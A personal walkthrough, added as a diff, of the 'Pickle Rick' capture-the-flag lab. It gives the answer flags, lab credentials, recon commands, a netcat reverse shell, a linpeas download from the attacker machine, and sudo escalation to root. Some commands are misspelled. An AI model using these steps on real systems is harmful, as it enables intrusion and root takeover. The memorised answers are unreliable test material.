@@ -1,0 +1,35 @@
+
+							    Pickle Rick
+							   =============
+
+1. What is the first ingredient Rick needs?
+ans: mr. meeseek hair
+command: nmap -sC -sV 10.10.7.74 > nmap.txt
+command: gobutser dir -u 10.10.7.74 --wordlist /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt 
+	 -x html,js,php,txt -o gobuster.txt
+command: curl 10.10.7.74 | grep -E "Username" (username:R1ckRul3s)
+command: curl 10.10.7.74/robots.txt (password:Wubbalubbadubdub)
+command: ls (after login in command panel use this )
+command: grep . Sup3rS3cretPickl3Ingred.txt (in command panel use this)
+
+
+2. What is the second ingredient Rick needs?
+ans: 1 jerry tear
+command: python3 --version (in command panel)
+command: nano python3_shell.py (modify your shell)
+command: nc -nvlp 9999 (your port)
+	 copy your shell and paste in command panel(browser)
+command: python3 -c 'import pty;pty.spawn("/bin/bash")' (proper shell)
+command: ./upload_file_nc.sh ~/Documents/scripts/linux_privs/linpeas.sh (open main terminal)
+command: nc -q 0 10.9.43.114 29062 > /dev/shm/linpeas.sh (shell computer)
+command: cd /dev/shm
+command: chmod +x linpeas.sh
+command: ./leanpeas.sh
+command: sudo bash (reason is sudo: ["ALL=(ALL) NOPASSWD:ALL"])
+command: cd /home/rick
+command: cat *
+
+
+3. What is the final ingredient Rick needs?
+ans: fleeb juice
+command: cat /root/3rd.txt
